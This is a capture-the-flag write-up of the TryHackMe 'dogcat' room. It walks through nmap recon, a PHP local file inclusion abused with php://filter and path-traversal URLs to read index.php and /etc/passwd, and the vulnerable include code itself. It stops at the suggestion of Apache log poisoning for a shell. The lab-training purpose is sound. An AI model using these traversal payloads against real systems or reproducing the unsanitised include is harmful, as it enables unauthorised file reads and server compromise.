# Dog Cat VM
[Play here](https://tryhackme.com/room/dogcat)

## Recon

Exploring the website, we see that images come in the form of: 
`http://10.10.13.155/cats/7.jpg`

```
❯ nmap -script=default -sV -A 10.10.13.155
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 23:30 EST
Nmap scan report for 10.10.13.155
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.90 seconds
```


We can access this :( `http://10.10.13.155/cats/`

Gobuster shows `/cat.php` and `/dog.php`; which shows random images of cats and dogs respectively. Okay. Wow what? There seems no other option than messing around with `php` stuff. 

The room already gives us the hint of having LFI. Looking at [OWASP LFI](php://filter/convert.base64-encode/resource=FILE) we get this `http://vulnerable_host/preview.php?file=../../../../etc/passwd%00` giving us the exact path to the etc file, and we have a filter `php://filter/convert.base64-encode/resource=FILE`. As they metion in `OWASP LFI`, 

> However, in some specific implementations this vulnerability can be used to upgrade the attack from LFI to Remote Code Execution vulnerabilities that could potentially fully compromise the host.

> This enhancement is common when an attacker could be able to combine the LFI vulnerability with certain PHP wrappers.

Sounds interesting. When we go to `http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=dog` we see `<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />`. Exactly as we expected.

However, going to `http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd` shows us

![](https://i.imgur.com/6RCCMBr.png)

Note how it wants us to only look at cats or dogs. I put in `http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd` to sneak, and it gives:

![](https://i.imgur.com/rTB0ycb.png)

So now using that null byte, we get:

![](https://i.imgur.com/U4LAy7k.png)

Nothing yet. So it'd now help to have a look at the index file itself.

```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

This makes a lot of sense. We can see it always wants dog or cat included. It also has this parameter `ext`, which we can set or unset. This means the url must look like:

```
http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=dog../../../../../../etc/passwd&ext=
```

This gives us the contents of the `/etc/passwd` file!

Looking at the contents, we do not find anything out of the blue. What to do next? Well time for a reverse shell. The question is, how do we setup one?


The answer is using `Apache Log Poisoning`.

`http://10.10.152.133/?view=dog/../../../../../var/log/apache2/access.log&ext=`

